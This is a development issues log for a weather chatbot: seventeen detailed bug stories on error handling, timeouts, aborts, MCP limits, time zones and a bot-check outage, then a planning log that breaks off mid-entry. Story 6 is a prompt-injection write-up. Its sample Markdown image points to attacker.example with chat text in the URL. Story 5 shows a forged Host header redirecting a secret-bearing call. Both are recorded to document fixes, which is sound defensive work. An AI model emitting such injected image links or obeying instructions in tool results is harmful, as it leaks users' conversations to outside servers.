# Issues and Fixes

Every problem we met while building and deploying Nimbus, and how it was fixed. Each build step adds its own, in
the same change as its code; the newest step is last. An entry says what happened and why, then the fix, and what
now checks it, so it can't quietly come back. *Found by* says how it surfaced: **testing a real API**, **checking our
work** (the type check, the tests, screenshots, contrast), the **review** that every step gets from an independent
reviewer before its commit, **reading a package's code**, or **deploying**. The bug stories come first: the real bugs,
each told in full.

## Bug Stories: Found, Traced, Fixed, Verified

Most entries in the log are small. These seventeen were real bugs or holes, the kind worth telling in an interview. Each
story gives the request that went wrong, what we saw, why it happened, how we traced it, how we fixed it, and how we
checked the fix, with the test that now keeps it fixed. The entry numbers point into the log below.

| # | Story | Step | Found by |
|---|---|---|---|
| 1 | A bad tool call blamed the assistant | 5 | our own test, then the review |
| 2 | One answer, two endings | 5 | the review |
| 3 | A slow weather service, reported as the model failing | 3 and 4 | the review |
| 4 | One request, a hundred tool calls | 4 | the review |
| 5 | The MCP call's address came from a header | 4 | the review |
| 6 | An image that could carry the chat away | 3 | the review |
| 7 | The golden questions met the live site | 3 | deploying |
| 8 | The deploy check that never saw CI finish | 2 | deploying |
| 9 | A test that couldn't fail | 2 | the review |
| 10 | The fallback that Stop couldn't reach | 6 | checking our work, then the review |
| 11 | A lane change showed the model the page's records | 6 | the review |
| 12 | The Actor's answer wasn't the shape we assumed | 6 | deploying |
| 13 | Tomorrow, by whose clock? | after 6 | deploying |
| 14 | The MCP door that would have run any build | 7 | the review |
| 15 | An error part closed the lane while the answer went on | after 7 | the review |
| 16 | Stop that didn't stop | after 7 | the review, then the live site |
| 17 | The bot check that blocked every user | 8 | the live site |

### 1. A bad tool call blamed the assistant

*Step 5 · found by our own test, then the review · entries 54 and 60*

**The request.** You ask for Paris's weather "for the next month". Gemini calls `get_forecast` with
`{"latitude": 48.8534123, "longitude": 2.3488123, "days": 30, "includeHourly": false, "units": "metric"}`, but the tool
takes at most 16 days. Models make such mistakes: a number out of range, a missing field, a tool that doesn't exist.
AI SDK checks every call's input against the tool's schema, doesn't run a bad call, and tells the model, which can
call again with 16.

**What went wrong.** The chip for that call said "The assistant didn't answer. Please try again.", as if Gemini were
down, while it was answering and about to correct itself. And no log line said a bad call had happened.

**Why it happened.** AI SDK 7 sends the page two chunks for a bad call: `tool-input-error`, built from its error object
(`InvalidToolInputError`), and `tool-output-error`, built from only that error's text,
`"AI_InvalidToolInputError: Invalid input for tool get_forecast: …"`. The chip shows the last one. Our code chose the
sentence by the error's class, so the object got the right sentence and the text got the general one. The logs missed
it for another reason: they were written when a tool ran, and a bad call never runs.

**How we traced it.**

1. Step 3's review had flagged that bad input got the general sentence. That fix gave the error object its own
   sentence, and its unit test passed, but the test called our function with the object, not with what the page
   receives.
2. Step 5's acceptance test, `tests/unit/chat/error-map.test.ts`, plays every error class through a whole chat turn:
   AI SDK's mock model in place of Gemini, the real AI SDK and lane, and the chunks as the page reads them. Its
   bad-call case found two sentences, the right one and "Something went wrong. (ref b1a0d9e8)", and no `tool.call`
   line.
3. A throwaway test printed every chunk and every error AI SDK handed our code: first the error object, then a plain
   string. The step's own record showed where the real error is kept: on the `tool-call` part, marked `invalid: true`.
4. A call to a tool that doesn't exist (`get_tides`) showed the same pair, as `AI_NoSuchToolError`.
5. Step 4's code sent any text to the general sentence: the chip had been wrong since step 3.

**How we fixed it.**

- `lib/errors.ts` knows a bad call from the error or from its text, by AI SDK's two names for it, and makes it a
  `BadToolCallError`: "The assistant called a weather tool the wrong way.", logged at warn, since the model gets
  another try.
- `lib/chat/run-chat.ts` writes the bad call's line from the step's invalid `tool-call` part, since no tool ran to
  write it.
- The review then caught that this new line copied AI SDK's message, which quotes the model's input:
  `Type validation failed: Value: {"latitude":48.8534123,"longitude":2.3488123,"days":30,…}`. That's a place, to 7
  decimals, in the logs. The line now says what went wrong in our own words ("The model's input didn't match the
  tool's input schema."), never the input, and names the tool only if it's one of ours.

**How we confirmed it.** The acceptance test failed before each fix and passes after: one sentence on the chip, one
`tool.call` line at warn with `BadToolCallError`, and none of `48.8534123`, `2.3488123` or `"days":30` in any line.
`tests/unit/errors.test.ts` covers the error and both of its text forms. It can't be forced on the live site, since it
needs Gemini to make the mistake; when it happens, the logs show `"errorClass":"BadToolCallError"`.

**The lesson.** Test what the user sees, not the function in between: the same failure can reach you in two shapes,
and a fix tested on one of them can leave the other broken.

### 2. One answer, two endings

*Step 5 · found by the review · entry 61*

**The request.** A question whose first model call works (it asks to geocode Paris) and whose second fails: Gemini
answers `400` ("API key expired"), or `503`, or `429` once the free tier's quota is used up.

**What went wrong.** The answer's lines ended twice: `chat.failed` at error, then `chat.done` at info, as if it had
finished as well. A dashboard of answers would have counted it as a failure and a success.

**Why it happened.** We log `chat.done` from AI SDK's `onEnd` and `chat.failed` from its `onError`, assuming one or the
other. But when AI SDK's stream closes, it calls `onEnd` whenever a step was recorded and the run wasn't aborted, even
after `onError`. Our test of a model failure failed on the first call, before any step was recorded, so it never saw
this.

**How we traced it.** The reviewer read the stream's `flush` in AI SDK's built code (`ai/dist/index.js`, 7.0.156): it
has no check for an earlier error. We wrote the test that should show it, a mock model that asks for a tool on its
first call and fails its second with Gemini's `APICallError`, and it failed with
`["info upstream.http", "info tool.call", "info model.step", "error chat.failed", "info chat.done"]`.

**How we fixed it.** `runChat` notes in `onError` that the answer failed, and `onEnd` then skips `chat.done`; it still
closes the lane.

**How we confirmed it.** The test now ends on `"error chat.failed"`, with `ModelError` and Gemini's error as its cause.
With the check switched off, the same test fails again, so it guards the fix.

**The lesson.** Test the order of a library's callbacks, not only each one: the contract you assume ("failure or
success, never both") may not be the one the library keeps.

### 3. A slow weather service, reported as the model failing

*Steps 3 and 4 · found by the review · entries 32, 34 and 46*

**The request.** "Do I need an umbrella in Paris tomorrow?" while Open-Meteo is slow. Each tool call has 8 s, two tries
of 3 s with a short wait between, and the forecast isn't back in time.

**What went wrong, three times.**

- Step 3: the chip said "The assistant didn't answer." The model was fine; the weather service was slow.
- Step 3 too: pressing Stop during a tool call would have been logged as a failure.
- Step 4: with the first fix in place on REST, the same slow call through `MCP · no auth`, the default lane, said "The
  assistant didn't answer" again, and neither function logged it.

**Why it happened.** When a tool's budget runs out, AI SDK fires the tool's abort signal with a `TimeoutError`. Step 3's
Open-Meteo client passed that error on as it was, and any error that wasn't ours got the general sentence. Stop fires
the same signal, but Next.js aborts it with its own `ResponseAborted` error, not `AbortError`, so a check for
`AbortError` couldn't tell a stop from a failure. On MCP, the failed call's error is the MCP client's own,
`MCPClientError: Request was aborted`, wrapped around the abort, and the first fix never looked at it.

**How we traced it.** Each time, the reviewer followed one failure along its path and checked it against the
framework's code: the budget's `TimeoutError` through `lib/upstream/open-meteo.ts`; Next.js's request adapter
(`next/dist/server/web/spec-extension/adapters/next-request.js`) for Stop; the MCP lane's `callTool` error path. Our
own MCP test showed the wrapping: a stopped call came back as the client's error, not as the signal's reason.

**How we fixed it.** One helper, `toAbortKind(signal)` in `lib/utils.ts`, says why a signal fired: "timeout" when its
reason is a `TimeoutError`, "stop" for any other reason (Next.js's included), "none" when it hasn't fired. Every lane
uses it: a time limit becomes `UpstreamTimeoutError` ("The weather service took too long to answer."), and a stop is
passed on as the signal's own reason, and isn't logged as a failure.

**How we confirmed it.** A test on each path: the client (`tests/unit/upstream/open-meteo.test.ts`); each lane, with a
time limit and a `ResponseAborted` stop (`tests/unit/lanes/rest-no-auth.test.ts`,
`tests/unit/lanes/mcp-no-auth.test.ts`); the helper itself (`tests/unit/utils.test.ts`); and step 5's acceptance test,
for the chip's sentence and its warn line.

**The lesson.** When a fix is about how a kind of failure looks, put it where every path goes through it. Otherwise a
new path, here a new lane, brings the old bug back.

### 4. One request, a hundred tool calls

*Step 4 · found by the review · entries 45 and 65*

**The request.** Not a chat question: anyone can POST to `/api/mcp`, our public MCP server, a JSON-RPC batch, an array
of `tools/call` messages, in one HTTP request.

**What could go wrong.** Each message is a tool call, and each tool call asks Open-Meteo, twice if it retries. A rate
limit that counts requests, like step 8's, would see one request while our servers made up to 200 calls to Open-Meteo.

**Why it happened.** The MCP SDK still serves 2025-era clients, and that path takes a batch of up to 100 messages (its
`MAX_BATCH_SIZE`), in a body of up to 4 MB.

**How we traced it.** The reviewer asked what one request to a public endpoint can make it do, and read how the MCP SDK
reads a body. Writing this story, we checked the numbers in the SDK's own code: entry 45 had said "thousands", and the
cap is 100 (entry 65).

**How we fixed it.** `lib/weather/mcp-request.ts` checks every request before the MCP server sees it: one JSON-RPC
message, at most 8 KB, valid JSON. Anything else gets a JSON-RPC error with `400` or `413`.

**How we confirmed it.** `tests/unit/weather/mcp-request.test.ts` covers a batch, a large body (by its declared size and
by what arrives), a body that isn't JSON, and one message passed on intact. On the live site, on 29 October 2026: a
batch of two got `400` ("This server takes one message at a time."), a 9 KB body got `413` ("A message can be at most
8192 bytes."), a `GET` got `405`, and a real MCP client still listed and called the tools.

**The lesson.** A public endpoint's limits must count the work a request asks for, not the requests. And check a
finding's numbers in the code before you repeat them.

### 5. The MCP call's address came from a header

*Step 4 · found by the review · entry 47*

**The request.** A chat request on `MCP · no auth` with a forged `Host` header: `attacker.example`, say.

**What could go wrong.** The MCP lane calls `/api/mcp` on this same deployment, and step 4's first version took that
address from the request, and so from its `Host` header. A forged header would send the call, with the bypass secret
when the project has one, to another server.

**Why it happened.** On Vercel it was safe, since Vercel only routes its own domains to us; but the code trusted a
header that, anywhere else, the caller sets.

**How we traced it.** The reviewer followed the lane's URL back to where it came from: the request's own address.

**How we fixed it.** `toSelfOrigin` in `lib/lanes/open-lane.ts`: on Vercel, the request's address only if it's one of
the deployment's own (its URL, its branch's, the production domain, as Vercel lists them), else the deployment's own
URL; on a laptop, the request's address.

**How we confirmed it.** `tests/unit/lanes/open-lane.test.ts`: the production and branch addresses are kept, a forged
one becomes the deployment's URL, and a laptop keeps its own. On the live site, a real answer's chips show the call
going to `https://weather-chatbot-hazel.vercel.app/api/mcp`.

**The lesson.** Never build an address to call, least of all one that carries a secret, from a header the caller
controls.

### 6. An image that could carry the chat away

*Step 3 · found by the review · entry 28*

**The request.** A question whose tool result holds text that gets the model to put an image in its answer:
`![map](https://attacker.example/pixel.png?chat=what-you-asked)`. That's prompt injection: words in data the model
reads, acting as instructions.

**What could go wrong.** The page shows the answer as Markdown, and a browser fetches an image as soon as it's shown,
so whatever the model put in the image's address would go to that server, with no click. And links opened in the same
tab, so a click would wipe the chat.

**Why it happened.** Markdown viewers show images by default, and the answer is text the model wrote, partly from tool
results we don't control.

**How we traced it.** The reviewer read `components/chat-message.tsx`, where the answer's Markdown was shown with
react-markdown's defaults, with one question in mind: what can the model's text make the page do by itself?

**How we fixed it.** A component of its own for the answer, `components/answer-markdown.tsx`: no images
(`disallowedElements`), and links that open in a new tab, with `rel="noopener noreferrer"`. Raw HTML was already off.

**How we confirmed it.** The fix had no test until we wrote this story. Now `tests/e2e/chat-page.spec.ts` replays such
an answer in a real browser, and checks that no `img` is shown, that no request goes to the image's server, and that
the link opens in a new tab. With images allowed again, it fails ("Expected: 0, Received: 1"), so it guards the fix.

**The lesson.** Treat a model's output like user input: anything it can make the page do by itself, an attacker can
make it do.

### 7. The golden questions met the live site

*Step 3 · found by deploying · entries 38 and 39*

**The request.** `npm run evals` asks the live site five golden questions and checks each answer against the tool
results, among them "What's the weather in Tokyo right now?"

**What went wrong.** First nothing reached the site: Node failed every request with `UNABLE_TO_GET_ISSUER_CERT_LOCALLY`.
Then four of five passed, and Tokyo failed, though its answer, "overcast with a temperature of 11.9°C (feeling like
11.2°C)", was right.

**Why it happened.** This laptop's HTTPS goes through a certificate that Windows trusts and Node's own list doesn't.
The browser and Python's standard library worked, since they read Windows' list; pip, with a list of its own, fails
here too. And the Tokyo check wanted the rounded 12, while the plan's rule allows the tool's value as it is or
rounded; the model gave the tool's exact 11.9.

**How we traced it.** The error's `code` named the certificate problem, and the same request from Python's standard
library worked, which pointed at Node's own list. For Tokyo, we put the answer next to the tool result from the same
run: the numbers matched, so the check was wrong, not the bot.

**How we fixed it.** On such a machine, Node runs with `NODE_OPTIONS=--use-system-ca` (the README says so; Vercel's
servers don't need it). The Tokyo check accepts the value as it is or rounded, as the rule says.

**How we confirmed it.** The golden questions then passed five of five on the live site; on 29 October 2026 they passed
on both no-auth lanes, ten of ten, along with the MCP server's own check.

**The lesson.** An eval checks a rule, not a wording. When one fails, put the answer next to its tool results before
blaming the bot or the test.

### 8. The deploy check that never saw CI finish

*Step 2 · found by deploying · entry 16*

**The request.** After a push, a script on the developer's laptop waits for two things: the live site showing the new
build, and GitHub's CI run for that commit passing. It asked GitHub's API for `/actions/runs?head_sha=6dac3d5` every
15 seconds.

**What went wrong.** It never saw CI finish, though CI had passed all along.

**Why it happened.** GitHub's `head_sha` filter matches only a full, 40-character commit id, so the short `6dac3d5`
matched no run. And GitHub allows 60 unauthenticated requests an hour, which a check every 15 seconds uses up in 15
minutes.

**How we traced it.** The commit's page on GitHub showed CI had passed, so the script was what failed. Its question
named the commit by its short id, which the filter doesn't take; and its pace was set without looking at the limit.

**How we fixed it.** The script gets the full id with `git rev-parse`, asks at most once a minute, so an hour's wait
stays inside the limit, and prints the API's own errors instead of a silent "not yet".

**How we confirmed it.** Every deployment since has reported both. Step 4's push, for example, was live as `66f3e05`
after 47 seconds, and its CI run had passed by 63 seconds (run 40956543196).

**The lesson.** Before polling an API, read its matching rules and its rate limits, and print what it says: a silent
"not yet" hid both problems.

### 9. A test that couldn't fail

*Step 2 · found by the review · entry 8*

**The request.** The browser test "opens a tool chip" clicked a chip and checked that its request was on the page.

**What went wrong.** It passed whether the chip opened or not.

**Why it happened.** Playwright's `toContainText` reads all the text inside an element, including what a closed
`<details>` hides, so the request's text was "there" either way.

**How we traced it.** The reviewer asked of each test what change would make it fail, and for this one, nothing would.

**How we fixed it.** The test checks the chip's `open` attribute, absent before the click and present after, and that
the request is visible, not only there.

**How we confirmed it.** The test, in `tests/e2e/chat-page.spec.ts`, asserts `not.toHaveAttribute("open")` before the
click and `toHaveAttribute("open")` after, so a chip that stays closed fails it. It passes in every run, on a desktop
and on a 360-pixel phone screen.

**The lesson.** For each test, ask what would make it fail. If the answer is "nothing", it proves nothing.

### 10. The fallback that Stop couldn't reach

*Step 6 · found by checking our work, then the review · entry 75*

**The request.** On `REST · with auth`, the forecast tool runs the Apify Actor; when Apify fails or is too slow, it
asks `REST · no auth` for the same forecast instead. Stop, closing the page, or the answer's own 50-second budget
running out should end whatever is running, and nothing should start after it.

**What went wrong.** Three ways, all before release. Once the Actor's run had used up its 20 s, the fallback started
with a fresh 8-second timer and nothing else, so Stop no longer reached it, and it ran on for an answer nobody would
see. When Apify gave up by itself (its `408`, at about 18 s), the fallback got the tool's last 2 s. And when the
answer's own budget ran out during a run, the lane took it for Apify being slow: it fell back, logged `lane.fallback`
after the answer had ended, and started a call that nothing could stop.

**Why it happened.** AI SDK gives a tool one abort signal: Stop, the answer's budget and the tool's own budget,
merged. The Actor's 20 s was that tool budget, so once it fired, the signal was spent, and the fallback was given
`AbortSignal.timeout(8000)` alone. And a spent signal doesn't say which source fired it: both budgets end with the
same `TimeoutError`.

**How we traced it.** Writing this step's page, the sentence "Stop ends both" sent us back to our code, then to AI
SDK's, which merges a tool's budget into the signal it passes the tool without racing the call (`mergeAbortSignals`,
in `ai`'s tool runner): a fallback that starts after the budget is still used, but only a signal of our own can stop
it. A first fix joined the fallback's 8 s to the request's own signal; the independent review then asked what happens
when the answer's budget fires mid-run: the same `TimeoutError`, read as Apify being slow.

**How we fixed it.** The run's 20 s is now the lane's own timer, joined to the tool's signal, and the tool's budget
covers the run and the fallback: 28 s. So the tool's signal fires only when the answer is ending (Stop, the answer's
budget) or the tool's whole time is gone, and then nothing falls back. Otherwise the fallback gets the tool's last 8 s,
joined to the same signal, so Stop and the answer's budget still reach it.

**How we confirmed it.** Three tests in `tests/unit/lanes/rest-auth.test.ts`. The run's own timer fires, Open-Meteo
hangs, then Stop: the call ends with Stop's own error (before the fix, it ran past the test's 5-second limit). The
tool's signal fires with a `TimeoutError` during the run, as the answer's budget does: the call fails, and there's no
fallback and no `lane.fallback` line (before the fix, both). And the run's own timer still falls back.

**The lesson.** A merged signal says that something fired, not what. Give each limit whose firing means something
different its own timer, and check the shared signal before deciding what a failure means.

### 11. A lane change showed the model the page's records

*Step 6 · found by the review · entry 77*

**The request.** A chat asks about Paris on `REST · no auth`, then moves to `REST · with auth` and asks again. Each
turn sends the earlier messages, and the model should read only the weather from an earlier result: the request on
the wire, the times and a fallback's sentence are for the page.

**What went wrong.** In step 6's first version, after the move, the earlier `get_forecast` result reached Gemini
whole: the weather, and with it the wire record (Open-Meteo's address and the headers), the time it took and the
chip's summary. It was caught before release.

**Why it happened.** AI SDK's `convertToModelMessages` finds a result's `toModelOutput` by the tool's name, among the
tools it's given, and we gave it the current lane's. Until this step, every lane had the same four names, so the
lookup always found one. `REST · with auth` has two tools, and `get_forecast` isn't one of them, so AI SDK sent the
whole output instead.

**How we traced it.** The reviewer followed an earlier result from the page to the model: `run-chat.ts` passed
`lane.tools` to `convertToModelMessages`, and AI SDK looks the tool up with `getOwn(options.tools, toolName)`,
sending the whole output as JSON when it finds none.

**How we fixed it.** One function, `toModelWeather()` in `lib/lanes/lane.ts`, is what the model reads of every
tool's result, on every lane. The history is converted with every lane's tools (`HISTORY_TOOLS`, the same list that
checks a history's tool calls), not only the current lane's.

**How we confirmed it.** A test in `tests/unit/chat/run-chat.test.ts` sends a chat on `REST · with auth` whose
history holds a `get_forecast` result, and reads what the mock model received: the weather, with no Open-Meteo address
and no `durationMs`. Before the fix, it failed, showing the whole record.

**The lesson.** When a library looks something up by name, check which set it looks in. A rule that held by
coincidence (every lane had the same tool names) breaks the day the coincidence does.

### 12. The Actor's answer wasn't the shape we assumed

*Step 6 · found by deploying · entry 83*

**The request.** "What's the weather in Dallas, Texas for the next 3 days?" on `REST · with auth`, the first
question after Apify's token was set. The lane runs the Actor for one place, 3 days, daily, and reads its items into
our forecast.

**What went wrong.** Apify answered `201` in 3.5 s, with the forecast, and the lane refused it. The chip said "REST ·
with auth is unavailable: Apify answered in a way we didn't expect. Answered through REST · no auth instead. (ref
96b42d86)". The answer was right, from the fallback.

**Why it happened.** The Actor's output isn't documented. Its README speaks of one record per location, with
"time-series arrays" for the daily and hourly forecasts, so we read one item per place, with Open-Meteo's own arrays
inside. The real answer is one item per day (in hourly mode, one per hour), each repeating the place, with the Actor's
own field names: `temp_max_c`, `precipitation_probability_pct`, `datetime`.

**How we traced it.** The ref found the request's lines in Vercel's logs: `upstream.http` said Apify answered `201`
with 3 items, and `lane.fallback` said why the lane fell back: "The Actor gave 3 items for one location." The run's
output in Apify Console showed the 3 items whole. Two hourly questions then showed hourly mode: 24 and 48 items, one
an hour, and no day's summary.

**How we fixed it.** `lib/weather/actor-items.ts` reads the real shape: an item a day in daily mode, an item an hour in
hourly mode, every item for the place asked (the Actor echoes the coordinates it was sent), the days asked all there,
one after another; anything else is still a `ContractError`, and still falls back. Since hourly mode gives no days, a
forecast of hours gets its own summary ("24 hours · 20 to 27 °C · rain up to 17%") and no weather card, and hourly mode
covers at most 3 days, like `get_forecast`'s hours. The tests read the Actor's real answers, saved whole
(`tests/fixtures/apify/actor-dallas-daily.json` and `actor-dallas-hourly.json`), in place of the assumed one.

**How we confirmed it.** The tests read the Actor's real answers. On the live site, once the fix was live
(`a6365c5`), the same Dallas question ran through the Actor in 3.6 s with no fallback, its chip showing the `POST` to
Apify with the token masked; an hourly question got its 48 hours in 4.5 s.

**The lesson.** When a dependency's output isn't documented, read it in the shape you expect, refuse anything else
loudly, and keep a fallback. Then the first real call costs a log line, not a wrong answer, and the line says exactly
what to fix.

### 13. Tomorrow, by whose clock?

*After step 6 · found by deploying · entry 87*

**The request.** At 21:50 on 29 October in Dallas: "Will it rain in Dallas, Texas tomorrow afternoon? Give me the
chance of rain hour by hour."

**What went wrong.** The forecast came back with 48 hours, the 29th and the 30th in Dallas, so tomorrow afternoon was
in it; the answer said the forecast didn't reach it. Earlier that evening, another answer had called the 30th "this
afternoon".

**Why it happened.** The system prompt gave the model the time now in UTC, by then 02:50 on the 30th, and the rule
that a forecast's first day is today in its place. The model took "today" from the UTC date, so "tomorrow" became the
31st. Nothing told it the date where the user was, and a forecast of hours only carries no weekday to check against.

**How we traced it.** The answer named the data's end, "10 PM local time on October 30", and the tool's output held
the 29th and the 30th; the answer follows only from a "today" of the 30th, and the one place the 30th came from was
the UTC time in the system prompt.

**How we fixed it.** First a choice, the user's: whose "tomorrow"? Asked at 22:00 in Dallas about Paris, where it's
already 04:00 on Friday, "tomorrow" means Friday, the asker's tomorrow, not Paris's Saturday. So the page sends the
browser's time zone, checked as the locale is; the system prompt gives the user's own date and time, and works out
today's and tomorrow's dates and weekdays, wherever the place is; and every forecast carries `localNow`, the place's
time now, so the model can say when the place's date differs ("it's already Friday morning in Paris"). Without a time
zone, the days are the place's own.

**How we confirmed it.** Unit tests: at 22:00 in Dallas the prompt says today is Thursday the 29th and tomorrow Friday
the 30th, though UTC is on the 30th; both forecast paths give `localNow`; the Open-Meteo client tells a cached answer's
fetch time from the time it answered. Two golden questions, asked from a time zone whose date isn't UTC's, must
name the user's tomorrow. On the live site (`9e2d18a`), at 22:50 on Thursday in Dallas, already Friday in UTC, the
same question got "Tomorrow afternoon (Friday, October 30, 2026) in Dallas, Texas, the chance of rain is 0% for every
hour from 12:00 to 18:00 local time", and "Will it rain in Paris tomorrow?" asked from Dallas got Friday the 30th,
though Paris was already on Friday; it didn't add that Paris was already on Friday, which the prompt asks for. The two
golden questions passed on all three lanes, 6 of 6, and the browser tests against the live site, 48 of 48.

**The lesson.** "Today" belongs to a person and a place, not to a timestamp. Give the model the dates it needs, already
worked out, rather than a UTC instant and a rule for converting it.

### 14. The MCP door that would have run any build

*Step 7 · found by the review · entries 90 and 94*

**The request.** "What's the weather in Dallas, Texas for the next 3 days?" on `MCP · with auth`: the same Actor,
token and input as `REST · with auth`, through Apify's MCP server instead of its REST API. The REST door pins the
Actor's build (1.0.9), its run time (18 s) and a cap on its charge ($0.01) in its URL, so a new build or a new price
from the Actor's author can't reach our users unseen.

**What went wrong.** As first written, before its commit, the MCP lane ran the Actor through the Actor's own MCP tool,
`gochujang--open-meteo-weather-forecast`, which takes the Actor's input and `waitSecs`, nothing else. Every MCP run
would have used whatever build the Actor's author made its default, with no cap on its charge, and four documents said
that couldn't be helped: the MCP door "can't pin the Actor's build, time or cost".

**Why it happened.** We read the Actor's tool's input schema and took its limits for the door's. But the door has
other tools: Apify's own `call-actor` takes the same three limits, in `callOptions`.

**How we traced it.** The independent review checked that sentence against Apify's MCP server's source:
`callOptionsSchema`, in `src/tools/actors/call_actor.ts`, takes `build`, `timeout`, `maxItems` and
`maxTotalChargeUsd`, and `executeCallActor` starts the run with them. Its answer is the run shape we already read
(`RunResponse`: the status, and the default dataset's id), so only the first message had to change.

**How we fixed it.** The lane connects with `?tools=call-actor,gochujang/open-meteo-weather-forecast` and runs the Actor
through `call-actor`: the Actor, its input, `waitSecs: 18`, and `callOptions` with build 1.0.9, 18 s and $0.01, from
the same constants as the REST URL. The Actor's own tool is still listed, for our pin: its input must still take
`locations`, `forecastDays` and `mode`. The pin now also checks that `call-actor` takes the Actor, its input,
`waitSecs` and the three limits inside `callOptions`: Apify's server drops a key it doesn't know without a word, so a
renamed limit would vanish the same way (entry 94).

**How we confirmed it.** `tests/unit/chat/lane-examples.test.ts` reads the REST request's URL and checks that the MCP
request carries the same build, time and cost; `tests/unit/upstream/apify-mcp.test.ts` checks the message sent, and
that a `call-actor` whose `callOptions` doesn't take `build` fails the pin. On the live site, on 30 October 2026,
Apify Console showed `callOptions` reaching a run through the MCP door: an 18-second timeout, not the Actor's default
300 s, and $0.01 at most, as on the REST door's run beside it. Its build was 1.0.9, but that is also the Actor's latest
build, so the pin itself will only show on a run once a newer build is tagged latest.

**The lesson.** "Can't" is a claim like any other: check it before you write it down. When one tool lacks an option,
look at the server's other tools before you document the gap, and test twin doors against each other, so they can't
drift apart.

### 15. An error part closed the lane while the answer went on

*After step 7 · found by the review · entries 96 and 100*

**The request.** "Do I need an umbrella in Paris tomorrow afternoon?" on an MCP lane, when Gemini's stream holds a
chunk its provider can't read: `@ai-sdk/google` sends an error part for it and keeps streaming, here a tool call.

**What went wrong.** Nothing yet on the live site: the review found it in the code. The lane's connections would have
been closed at the error part, so the tool call after it would have met a closed MCP connection and failed. And where
the page's going reaches the function, the answer would have ended twice: the page stops at the error and goes, and
its going would have been logged as `chat.aborted` after `chat.failed`.

**Why it happened.** `runChat` closed the lane in AI SDK's `onError`, as if it were the answer's end. But AI SDK calls
`onError` for every error part and goes on after one: it still runs a step's tools if the step then ends with
`tool-calls`. Its `onEnd` and `onAbort`, which closed the lane too, come at the end.

**How we traced it.** The review read Gemini's provider and AI SDK's `streamText` in their built code. Writing the fix,
we read the other end as well: AI SDK's chat, on the page, throws on the first error chunk, shows our sentence and
stops reading, so for the user the answer ends there. Three tests, written first, failed: the tool call went out after
the lane's close (`[1]`, on a REST lane whose closes we count), the page's going added `chat.aborted`, and a close that
failed left no line at all.

**How we fixed it.** The lane is closed once, by the UI message stream's `onEnd`, which AI SDK calls when the stream
has ended or the page has gone (from its transform's `flush` and `cancel`; Node 22 calls `cancel` when the stream
feeding it fails, too). An answer that failed has one ending: after `chat.failed`, `onAbort` writes nothing. A close
that fails is logged as `lane.close`, never thrown into the stream's end, where it would turn a finished answer into an
error on the page. We also tried stopping the run ourselves at the error part, since the page has stopped reading: in
a test, it dropped the error part, and the page got only `start` and `abort`, without our sentence. AI SDK awaits
`onError` before it passes a model's error part on (it checks first whether to retry the stream), so a stop there
cancels the part. So the run stops when the page's going reaches it: on Next.js's own server now, and on Vercel once
cancellation is on (entry 101).

**How we confirmed it.** The three tests pass: the page gets our sentence and the tool call finds the lane open
(`[0]`), the lines end at `chat.failed`, the lane is closed once, and a failing close leaves `chat.done`, then
`lane.close`. Undoing each part of the fix fails at least one of them.

**The lesson.** Tie clean-up to the end of the stream, not to an event that can come in the middle of it; and before
deciding what an event means, read what the other end does with it.

### 16. Stop that didn't stop

*After step 7 · found by the review, then on the live site · entry 101*

**The request.** "What's the weather in Paris for the next 3 days, hour by hour?" on `MCP · no auth`, and then Stop,
or the page closed. On the live site, a script played the page: it hung up after the answer's first bytes.

**What went wrong.** The function never heard. It ran its tool calls and the model's steps to the end and logged
`chat.done` 3.7 s after the answer started, though the caller had hung up right after its first bytes. On an auth lane,
Stop would have left a paid Actor run going as well, for an answer no one would read.

**Why it happened.** On Vercel, a function hears that its caller has gone only when cancellation is turned on for it,
in `vercel.json`; it's off unless you ask. Next.js's own server aborts the request's signal when the page goes, and our
code, its comments and our docs took that for granted: "Stop cancels it."

**How we traced it.** The review of issue 96's fix read Vercel's docs and asked whether Stop reached the function at
all. A live hang-up answered: the request's lines ran on to `chat.done`, with no `chat.aborted`.

**How we fixed it.** `vercel.json` turns cancellation on for `app/api/chat/route.ts`. Vercel then ends the function
once it's told, so the route keeps it alive with `waitUntil` until the request's last line is written and its lane
closed. And the answer gets one last line however the page's going arrives: the review showed, with a script, that if
the stream is cancelled while the model's text is still coming, AI SDK can stall on its full queue and never call
`onAbort`, so the stream's own end writes `chat.aborted` when no other line has. A page that goes while its message is
still being read is logged as stopped, not as a refused message.

**How we confirmed it.** The tests play the page's going both ways, its signal first or its stream first, with the
text still coming: one `chat.aborted`, and the route told it may end only once the lane has closed. On the live site,
once `c295125` was live, two hang-ups, timed from the answer's start. One, right after the first bytes, was heard about
7 s later, after the model's first step and its second call, as the forecast call reached `/api/mcp`: `chat.aborted`,
7.4 s, one step. The other, at the answer's first words, was heard at once: `chat.aborted`, 6.0 s, two steps. Neither
had a `chat.done`, and neither came near the function's 60 s. So Stop now stops the answer on Vercel, but not always at
once: in a window like the first, an Actor run can still start.

**The lesson.** The platform is part of the behavior. A local server that hears a page go isn't a serverless platform
that, by default, doesn't: check what a stop does where the code runs, not where the tests do.

### 17. The bot check that blocked every user

*Step 8 · found on the live site · entry 111*

**The request.** Any message on the live site once `d9ed4c0` was live: "vizag weather", say.

**What went wrong.** Every message we sent, from one Chrome profile in two tabs (one our tools drove, one yours), got
"We couldn't verify this browser. Please reload the page.", for about 25 minutes: as far as we could tell, the chat
answered no one.

**Why it happened.** Step 8 put Vercel's BotID in front of the chat. Its page side ran (its script loaded, the page's
`fetch` wrapped), so each message carried BotID's answer, and its check on the server still called the browser a bot;
why is being traced. It reached users because nothing before them sent a real message: the browser tests answer
`/api/chat` inside the page, so BotID's verdict on the server was never asked, and the deploy check read only the build
line.

**How we traced it.** The live check after the deploy sent one real message, from a Chrome tab our tools drove, and
got the refusal; the page showed BotID running. Since a driven browser may look like a bot, the user tried their own
tab: refused too. It was the same Chrome profile, though, with the extension our tools drive it with, so it didn't
rule the extension out.

**How we fixed it.** A kill switch: one line in `next.config.ts` turns BotID off everywhere, on the page and on the
server (`810a981`). It was live two minutes later, and the chat answered again; the security headers stayed.

**How we confirmed it.** A real question, "What's the weather in Visakhapatnam today?", got its answer; then the user's
browser did too.

**The lesson.** Anything that can refuse users goes out watching first, logging its verdicts and refusing no one, with
a switch that turns it off at once; and every deploy is checked with a real request on the real path, since mocked
browser tests never ask the server.

## While Planning

1. **The "no auth" MCP server needed a sign-in.** *Testing a real API.* MCPBundles' Open-Meteo server answered an MCP
   `initialize` with `401` and `WWW-Authenticate: Bearer`: it's an auth server. **Fix:** the MCP no-auth lane is our
   own MCP server at `/api/mcp` (step 4); `PLAN.md`, section 3, row 1.
2. **Open-Meteo answered in GMT.** *Testing a real API.* The Dallas example, as given, said "now" was 17:00 when it
